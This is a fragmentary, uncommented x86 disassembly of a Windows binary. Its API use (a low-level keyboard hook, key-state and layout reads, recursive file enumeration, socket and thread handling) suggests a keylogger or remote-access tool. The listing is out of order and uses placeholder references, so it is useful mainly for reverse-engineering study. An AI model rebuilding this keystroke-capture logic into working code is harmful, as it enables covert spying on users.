lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_403f7f
add esp 0x10
lea eax [ ebp - 0x274 ]
push eax
push r--data
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2c8 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x2c8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x2b8 ] 0x1
push r--data
lea eax [ ebp - 0x2b8 ]
push eax
call _CxxThrowException
lea eax [ ebp - 0x274 ]
push eax
push [ ebp - 0x14 ]
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
push [ esi ]
sub esp 0x10
mov ecx esp
lea eax [ ebp - 0x2d0 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x65
call sub_4023d9
add esp 0x18
mov [ ebp - 0x2d4 ] 0x2
push r--data
lea eax [ ebp - 0x2d4 ]
push eax
call _CxxThrowException
or [ ebp - 0x4 ] 0xffffffff
push [ ebp - 0x14 ]
call [ FindClose@IAT ]
push [ esi ]
sub esp 0x10
mov esi esp
lea eax [ ebp + 0x38 ]
push eax
push edi
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x35c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push 0x67
call sub_4023d9
add esp 0x18
lea ecx [ ebp - 0x35c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
call sub_403dbc
pop ecx
pop ecx
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x40
test [ ebp - 0x274 ] 0x10
je r-xdata
lea eax [ ebp - 0x308 ]
push eax
lea eax [ ebp - 0x248 ]
push eax
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push [ tolower@IAT ]
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
push eax
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_403f7f
add esp 0x10
push 0x0
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
push r--data
lea eax [ ebp - 0x248 ]
push eax
mov ebx [ wcscmp@IAT ]
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x31c ]
push eax
push 0x250
lea eax [ ebp - 0x274 ]
push eax
lea ecx [ ebp - 0x318 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x318 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ esi ]
sub esp 0x10
mov ebx esp
lea eax [ ebp - 0x24 ]
push eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x334 ]
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x344 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push 0x66
call sub_4023d9
add esp 0x18
mov ebx eax
inc ebx
neg ebx
sbb ebx ebx
inc ebx
mov [ ebp - 0x320 ] bl
lea ecx [ ebp - 0x344 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x334 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test bl bl
je r-xdata
push r--data
lea eax [ ebp - 0x248 ]
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x348 ] 0x4
push r--data
lea eax [ ebp - 0x348 ]
push eax
call _CxxThrowException
push r--data
lea eax [ ebp - 0x2e8 ]
push eax
lea eax [ ebp - 0x248 ]
push eax
lea ecx [ ebp - 0x2e4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2f8 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x294 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x2f8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x2e4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
mov ecx esp
lea eax [ ebp + 0x18 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
mov ecx esp
lea eax [ ebp - 0x294 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx esi
call sub_403b1f
test al al
jne r-xdata
lea ecx [ ebp - 0x294 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov [ ebp - 0x304 ] 0x3
push r--data
lea eax [ ebp - 0x304 ]
push eax
call _CxxThrowException
sub_403b1f
push ebp
mov ebp esp
sub esp 0x2dc
push ebx
push esi
push edi
mov edi ecx
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x2c ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi [ tolower@IAT ]
lea ecx [ ebp + 0x18 ]
push esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
push eax
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_403f7f
add esp 0x10
lea eax [ ebp - 0x2dc ]
push eax
lea eax [ ebp + 0x8 ]
push r--data
push eax
lea eax [ ebp - 0x3c ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ FindFirstFileW@IAT ]
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x8 ] eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov al 0x1
lea eax [ ebp - 0x2dc ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
test [ ebp - 0x2dc ] 0x10
je r-xdata
lea eax [ ebp - 0xa ]
lea ecx [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2b0 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push esi
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_403f7f
add esp 0x10
lea eax [ ebp + 0x18 ]
lea ecx [ ebp - 0x1c ]
push 0x0
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
mov ebx [ wcscmp@IAT ]
lea eax [ ebp - 0x2b0 ]
push r--data
push eax
call ebx
pop ecx
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x9 ]
lea ecx [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x2dc ]
push 0x250
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ edi ]
lea eax [ ebp - 0x2c ]
sub esp 0x10
mov ebx esp
push eax
lea eax [ ebp + 0x8 ]
push rw-data
push eax
lea eax [ ebp - 0x7c ]
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x5c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push 0x66
call sub_4023d9
add esp 0x18
cmp eax 0xffffffff
lea ecx [ ebp - 0x5c ]
sete bl
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test bl bl
jne r-xdata
lea eax [ ebp - 0x2b0 ]
push r--data
push eax
call ebx
pop ecx
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
xor al al
jmp r-xdata
lea eax [ ebp - 0x1 ]
push 0x5c
push eax
lea eax [ ebp - 0x2b0 ]
push eax
lea ecx [ ebp - 0x6c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8c ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x3c ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@G@Z
add esp 0xc
lea ecx [ ebp - 0x8c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x6c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
lea eax [ ebp + 0x18 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x3c ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx edi
call sub_403b1f
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x20
sub_403dbc
mov eax sub_4126c4
call _EH_prolog
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
and [ ebp - 0x4 ] 0x0
xor edi edi
mov [ ebp - 0x14 ] edi
mov esi rw-data
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
mov ecx esi
call sub_403eb5
mov eax [ eax ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
inc edi
mov [ ebp - 0x14 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_403eb5
mov eax [ eax + 0x8 ]
push [ eax ]
call closesocket
push 0x0
push edi
mov ecx esi
call sub_403eb5
push [ eax + 0x4 ]
call [ TerminateThread@IAT ]
mov ecx esi
call sub_409357
lea ecx [ edi + edi * 2 ]
lea eax [ eax + ecx * 4 ]
push eax
mov ecx esi
call sub_403ee2
mov ecx esi
call sub_403e9f
cmp edi eax
jae r-xdata
sub_403e6b
push esi
mov esi ecx
push edi
push [ esi + 0x8 ]
push [ esi + 0x4 ]
call sub_403f1a
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0xc ]
sub eax ecx
push 0xc
cdq
pop edi
idiv edi
push eax
push ecx
mov ecx esi
call sub_401b64
xor eax eax
pop edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
pop esi
retn
sub_403eb5
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_403e9f
mov esi [ ebp + 0x8 ]
cmp eax esi
ja r-xdata
mov ecx edi
call sub_409357
lea ecx [ esi + esi * 2 ]
pop edi
pop esi
lea eax [ eax + ecx * 4 ]
pop ebp
retn 0x4
mov ecx edi
call sub_403f3c
sub_403ee2
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push edi
call sub_411d79
push eax
lea eax [ edi + 0xc ]
push eax
call sub_403fa7
mov eax [ esi + 0x8 ]
add esp 0xc
mov ecx esi
push eax
add eax 0xfffffff4
push eax
call sub_403f1a
add [ esi + 0x8 ] 0xfffffff4
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
sub_403f1a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x8
push esi
mov ecx edi
call sub_403f6f
add esi 0xc
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_403f3c
push ebp
mov ebp esp
sub esp 0x30
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x30 ]
push eax
call [ std::out_of_range::out_of_range@IAT ]
lea eax [ ebp - 0x30 ]
push r--data
push eax
call _CxxThrowException
sub_403f7f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
pop esi
pop ebp
retn
movzx eax [ esi ]
push eax
call [ ebp + 0x14 ]
pop ecx
inc esi
mov ecx [ ebp + 0x10 ]
inc esi
add [ ebp + 0x10 ] 0x2
mov [ ecx ] ax
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_403fa7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x10 ]
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
movsd [ edi ] [ esi ]
add [ ebp + 0x10 ] 0xc
add eax 0xc
cmp eax [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
sub_403ffa
push esi
mov esi ecx
lea ecx [ esi + 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ esi + 0x64 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ esi + 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ esi + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ esi + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
retn
sub_40402c
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ esi + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ esi + 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ esi + 0x54 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ esi + 0x64 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ esi + 0x74 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x3c ] al
mov [ esi + 0x3d ] al
mov [ esi + 0x30 ] al
mov eax esi
pop esi
leave
retn
sub_404086
push esi
mov esi ecx
push 0x0
call [ GetKeyboardLayout@IAT ]
push 0x9
and eax 0x3ff
pop ecx
cmp ax cx
je r-xdata
mov [ esi + 0x38 ] ecx
pop esi
retn
push 0x10
pop edx
cmp ax dx
jne r-xdata
mov [ esi + 0x38 ] edx
pop esi
retn
sub_4040b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea eax [ ebp + 0x8 ]
push edi
push eax
lea ecx [ esi + 0x54 ]
mov [ esi + 0x3c ] 0x1
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
mov ecx esi
call sub_404086
xor edi edi
cmp [ rw-data ] 0x32
mov ebx r--data
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x2 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
mov ebx [ CreateThread@IAT ]
push edi
push edi
push esi
push sub_4041bb
push edi
push edi
call ebx
cmp [ esi ] edi
jne r-xdata
push edi
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_404cef
push edi
push edi
push esi
push sub_4041ca
push edi
push edi
call ebx
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x10
push edi
push edi
push esi
push sub_40419b
push edi
push edi
call ebx
sub_404163
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
xor eax eax
cmp [ esi + 0x3c ] al
jne r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop esi
pop ebp
retn 0x10
push eax
push eax
push esi
push sub_4041aa
push eax
push eax
call [ CreateThread@IAT ]
sub_404206
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
mov esi ecx
xor edi edi
mov [ rw-data ] esi
cmp [ esi ] edi
jne r-xdata
push edi
push edi
lea eax [ ebp - 0x1c ]
push edi
push eax
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
push edi
push edi
push sub_4041eb
push 0xd
call [ SetWindowsHookExA@IAT ]
mov [ esi ] eax
pop edi
xor eax eax
pop esi
leave
retn
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
jmp r-xdata
cmp [ esi ] edi
je r-xdata
sub_40425e
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
push 0x5
lea edi [ ebx + 0x40 ]
pop ecx
[ edi ] [ esi ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebx ]
call [ CallNextHookEx@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
sub eax 0x100
je r-xdata
mov esi [ GetKeyState@IAT ]
push 0x14
call esi
test ax ax
je r-xdata
dec eax
je r-xdata
and [ ebx + 0x2c ] 0x0
push 0x14
call esi
cmp ax 0xff80
je r-xdata
mov ecx ebx
call sub_405ab4
mov ecx ebx
call sub_405ad8
mov ecx ebx
call sub_405a5c
jmp r-xdata
sub eax 0x3
jne r-xdata
and [ ebx + 0x2f ] 0x0
mov ecx ebx
call sub_40584d
mov [ ebx + 0x2c ] 0x1
jmp r-xdata
mov ecx ebx
call sub_4059cc
jmp r-xdata
mov ecx ebx
call sub_405aa2
mov ecx ebx
call sub_405ac6
mov ecx ebx
call sub_404dad
cmp [ ebx + 0x2f ] 0x0
jne r-xdata
sub_40430b
push ebp
mov ebp esp
sub esp 0x420
push ebx
mov ebx [ Sleep@IAT ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi rw-data
lea eax [ ebp - 0x1 ]
push r--data
push eax
lea eax [ ebp - 0x420 ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x38 ]
push r--data
push eax
